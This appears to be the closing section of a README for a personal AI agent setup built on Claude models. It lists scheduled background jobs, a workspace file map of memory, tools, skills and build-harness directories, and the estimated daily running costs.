| weekly-memory-compound | Sunday 10 PM | Sonnet | Weekly distillation |
| daily-task-prep | 6 AM daily | Sonnet | Task promotion + dedup |
| email-sweep | Every 15 min | Sonnet | Inbox triage |
| meta-review | Sunday 10 AM | Sonnet | Episode analysis |
| episode-consolidation | Sunday 3 AM | Sonnet | Duplicate merge + archive |
| episode-index-rebuild | 2 AM daily | Sonnet | Episode search index |

### File Map

```
workspace/
├── AGENTS.md              # Boot sequence
├── SOUL.md                # Agent identity
├── USER.md                # Human profile
├── MEMORY.md              # Long-term memory index
├── CONTEXT_INJECTION.md   # Auto-generated recent context
├── HEARTBEAT.md           # Heartbeat checklist
├── active-tasks.md        # Crash recovery
├── consent-registry.md    # Consent tracking for sensitive ops
├── memory/
│   ├── YYYY-MM-DD.md      # Daily logs
│   ├── hourly/            # Hourly summaries
│   ├── weekly/            # Weekly distillations
│   ├── ingested/          # Brain-ingest outputs
│   ├── retros/            # Engineering retrospectives
│   ├── trace-analysis/    # Forge reports + pattern database
│   ├── episodes/          # Episodic memory (JSON)
│   ├── wiki/              # LLM Wiki (entities + concepts)
│   ├── user-profile.md    # User details
│   ├── infrastructure.md  # Tools & infra notes
│   ├── projects.md        # Active projects
│   └── lessons-learned.md # Hard-won lessons
├── shared-context/
│   ├── priorities.md      # Priority stack
│   ├── agent-outputs/     # Per-agent output dirs
│   ├── feedback/          # Structured feedback
│   ├── roundtable/        # Cross-agent synthesis
│   ├── kpis/              # Metrics
│   └── calendar/          # Events
├── tasks/
│   ├── current.md         # Canonical task list
│   └── archive/           # Weekly task archives
├── campaigns/             # Long-running workflow state
├── tools/
│   ├── vector-memory/     # FAISS semantic search
│   ├── brain-ingest/      # URL → knowledge pipeline
│   ├── forge/             # Monitoring agent prompts
│   ├── wiki/              # LLM Wiki tools (ingest, lint, contradictions)
│   ├── episodes/          # Episodic memory tools
│   ├── episodic-memory/   # Meta-review scripts
│   ├── security/          # 6-layer defense tools
│   ├── email-sweep/       # Email triage config
│   ├── hourly-summarizer.py
│   ├── context-injector.py
│   ├── weekly-compound.py
│   ├── roundtable.py
│   ├── feedback-logger.py
│   ├── daily-task-prep.sh
│   └── ensure-daily-log.sh
├── skills/                # Custom skills (SKILL.md each)
│   ├── evaluator/         # GAN-style skeptical evaluator
│   ├── build-harness/     # 3-agent build orchestration
│   ├── brain-ingest/      # Knowledge ingestion
│   ├── email-sweep/       # Email triage
│   └── [other skills]/
├── .harness/              # Build harness working directory (per-project)
│   ├── spec.md            # Planner output
│   ├── design-language.md # Visual direction
│   ├── contracts/         # Sprint contract negotiations
│   ├── evaluations/       # Evaluator scores + feedback
│   └── harness-log.md     # Running log
└── decisions/             # Documented decisions with review dates
```

### Cost Expectations

With all crons running on Sonnet and direct chat on Opus:
- **Hourly summarizer:** ~$0.01/run x 24 = ~$0.24/day
- **Vector reindex:** Free (local Python)
- **Roundtable:** ~$0.02/run = ~$0.02/day
- **Forge daily:** ~$0.05/run = ~$0.05/day
- **Morning brief:** ~$0.10/run = ~$0.10/day
- **Weekly crons:** ~$0.15/week
- **Heartbeats (Sonnet, every 30min):** ~$0.005/run x 48 = ~$0.24/day
- **Email sweep:** ~$0.005/run x 48 = ~$0.24/day
- **Total background cost: ~$0.90/day or ~$27/month**

Direct conversations (Opus) are additional, based on usage.

---

*Built by Sardor Umarov. Working implementation at Exchange Building. Battle-testing since February 2026 — continuously evolving, so check back for the latest version.*
